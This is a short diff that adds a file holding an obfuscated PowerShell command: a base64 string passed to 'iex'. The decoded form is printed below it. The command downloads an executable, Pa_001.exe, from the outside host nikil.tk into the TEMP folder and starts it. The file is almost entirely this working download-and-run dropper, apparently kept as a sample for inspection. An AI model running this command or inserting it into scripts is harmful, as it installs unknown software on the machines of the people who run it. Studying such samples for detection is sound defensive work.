@@ -1,0 +1,7 @@
+iex([SySTEM.Text.EncODiNG]::uTf8.GetSTRInG([sySTeM.cOnVERT]::FrOMbASE64sTriNG('CihOZXctT2JqZWN0IHN5c3RFTS5OZXQud2ViY0xpZU50KS5kT1dOTE9hZEZJTGUoJ2h0dHA6Ly9uaWtpbC50ay9wMS9QYV8wMDEuZXhlJywiJEVuVjpURU1QXFBhXzAwMS5leGUiKTtTdGFydC1Qcm9jZXNzICgiJEVuVjpURU1QXFBhXzAwMS5leGUiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object systEM.Net.webcLieNt).dOWNLOadFILe('http://nikil.tk/p1/Pa_001.exe',"$EnV:TEMP\Pa_001.exe");Start-Process ("$EnV:TEMP\Pa_001.exe")
+
